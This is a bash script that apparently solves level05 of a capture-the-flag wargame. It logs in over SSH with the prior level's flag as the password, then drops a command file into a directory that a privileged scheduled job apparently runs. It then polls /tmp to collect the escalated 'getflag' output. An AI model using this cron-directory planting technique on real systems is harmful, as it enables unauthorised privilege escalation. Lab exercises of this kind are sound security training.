#!/usr/bin/env bash

if [ "$(dirname "$0")" == "." ]; then
	ROOT_DIR=$(dirname $(dirname $PWD))
else
	ROOT_DIR=$(dirname $(dirname $(dirname "$0")))
fi

SCRIPT='
echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag;
chmod +x /opt/openarenaserver/flag;
while :;
do
  if [ -f "/tmp/flag05" ]; then
    cat /tmp/flag05;
    break;
  fi;
  sleep 10;
done;
'

if [ ! -z "$1" ]; then
	PASS=$(sshpass -p $(cat $ROOT_DIR/level04/flag) ssh level05@$1 -p 4242 "$SCRIPT")
	PASS=$(echo $PASS | awk '{print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag05.pwd
else
	echo "Usage: ./flag05.sh <ip address>"
fi
